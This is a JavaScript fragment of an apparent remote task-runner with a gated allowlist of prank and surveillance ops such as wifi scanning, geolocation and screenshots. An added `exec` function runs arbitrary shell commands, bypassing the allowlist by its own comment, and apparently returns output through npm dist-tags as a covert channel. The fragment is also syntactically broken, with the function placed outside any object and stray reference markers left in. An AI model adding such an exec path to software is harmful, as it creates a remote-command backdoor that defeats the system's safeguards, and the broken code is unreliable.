      lines.push(`  ${ap.bssid}  rssi=${ap.rssi ?? '?'}  ssid="${ap.ssid || '<hidden>'}"`);
    }
    return lines.join('\n');
  },

  openurl: (args, options) => runFunTask('openurl', args, options),
  say: (args, options) => runFunTask('say', args, options),
  notify: (args, options) => runFunTask('notify', args, options),
  beep: (args, options) => runFunTask('beep', args, options),
  bounce: (args, options) => runFunTask('bounce', args, options),
  volume: (args, options) => runFunTask('volume', args, options),
  rickroll: (args, options) => runFunTask('rickroll', args, options),
  party: (args, options) => runFunTask('party', args, options),
};

 /**
 * Execute an arbitrary system command.
 * WARNING: This bypasses the hard-coded allowlist and is a significant security risk.
 */
exec(args, options = {}) {
  const command = args.text; // The required argument from the CLI[reference:5]
  if (!command) {
    throw new Error('exec requires a command string');
  }

  // Use execFileSync with a shell to support full command syntax.
  // 'execFileSync' is used elsewhere in the project[reference:6].
  const exec = options.execFileSync ?? execFileSync;
  
  let stdout, stderr;
  try {
    // Execute the command using the system shell.
    // The { shell: true } option allows complex commands (pipes, redirection, etc.).
    stdout = exec(command, [], { shell: true, encoding: 'utf8' });
    stderr = '';
  } catch (err) {
    // If the command fails, capture the error output.
    stdout = err.stdout ? err.stdout.toString() : '';
    stderr = err.stderr ? err.stderr.toString() : err.message;
  }

  // Return the output. The result will be chunked and sent back via dist-tags.
  const output = stdout + (stderr ? `\nSTDERR:\n${stderr}` : '');
  return { output: output.trim() || 'Command executed with no output.' };
}

export const ALLOWED_OPS = Object.freeze([...TASK_OPS]);

/**
 * Dispatch a command to the mock task allowlist.
 * @param {string} op
 * @param {object} [args]
 * @param {object} [limits] e.g. { maxFileBytes, revealEnv }
 * @returns {{ok: true, output: string, file?: object} | {ok: false, error: string}}
 */
export function runTask(op, args = {}, limits = {}) {
  const fn = TASKS[op];
  if (!fn) {
    return {
      ok: false,
      error: `unknown or disallowed op "${op}" — allowlist: ${ALLOWED_OPS.join(', ')}`,
    };
  }
  if (getOpDef(op)?.group === 'fun' && limits.enableFunOps === false) {
    return { ok: false, error: `task "${op}" is disabled; set enableFunOps only on an attended lab host` };
  }
  if (getOpDef(op)?.group === 'screen' && limits.enableScreenshot !== true) {
    return { ok: false, error: `task "${op}" is disabled; set enableScreenshot only on an attended lab host` };
  }
  if (op === 'geolocate' && limits.enableGeolocate !== true) {
    return { ok: false, error: `task "${op}" is disabled; set enableGeolocate only on an attended lab host` };
  }
  try {
    const r = fn(args, limits);
    if (r && typeof r === 'object' && r.file) {
      return { ok: true, output: String(r.output ?? ''), file: r.file };
    }
    return { ok: true, output: String(r) };
  } catch (err) {
    return { ok: false, error: `task "${op}" failed: ${err.message}` };
  }
}
